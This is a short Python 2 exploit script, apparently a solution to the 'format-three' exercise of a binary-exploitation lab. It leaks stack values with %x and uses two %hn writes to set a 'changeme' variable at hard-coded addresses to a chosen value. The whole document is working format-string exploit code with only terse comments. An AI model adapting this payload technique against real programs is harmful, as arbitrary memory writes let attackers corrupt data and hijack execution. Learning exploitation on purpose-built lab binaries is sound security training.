# nm format-three | grep changeme
lower_addr = "\x44\x98\x04\x08"
pad = "AAAA"
upper_addr = "\x46\x98\x04\x08"

upper_target = 0x6445
lower_target = 0x7845

# run < <(python -c 'print "AAAA" + "%x." * 12')
upper_diff = len("AAAA0.0.0.f7f81cf7.f7ffb000.ffffd6f8.8048556.ffffc6f0.ffffc6f0.fff.0.41414141".split("."))
upper_div, upper_rem = divmod(upper_target - upper_diff, 10)
if upper_rem == 0:
    upper_div -= 1
    upper_rem += 10

# lower_target: (0x_000), _ != 0
lower_diff = lower_target - upper_target if lower_target >= upper_target else lower_target + 1

payload = upper_addr + pad + lower_addr + "%{}x".format(upper_div) * 10 + "%{}x".format(upper_rem) + "%hn" + "%{}x".format(lower_diff) + "%hn"
print payload
